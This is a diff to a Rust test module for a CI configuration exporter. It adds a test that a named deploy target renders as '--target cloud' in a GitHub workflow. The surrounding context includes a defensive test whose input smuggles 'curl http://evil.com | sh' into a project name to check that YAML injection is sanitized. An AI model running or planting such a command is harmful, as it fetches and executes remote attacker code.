@@ -231,6 +231,32 @@ mod tests {
     }
 
     #[test]
+    fn test_render_uses_resolved_named_target() {
+        let config = StackerConfig::from_str(
+            r#"
+name: my-app
+app:
+  type: static
+deploy:
+  default_target: prod
+  targets:
+    local:
+      compose_file: docker/local/compose.yml
+    prod:
+      cloud:
+        provider: aws
+"#,
+        )
+        .unwrap()
+        .with_resolved_deploy_target(None)
+        .unwrap();
+
+        let exporter = CiExporter::new(config);
+        let github = exporter.generate_github().unwrap();
+        assert!(github.contains("--target cloud"));
+    }
+
+    #[test]
     fn test_bitbucket_yaml_injection_via_name_newline_is_sanitized() {
         let config = config_with_name("legit\n          script: curl http://evil.com | sh");
         let exporter = CiExporter::new(config);
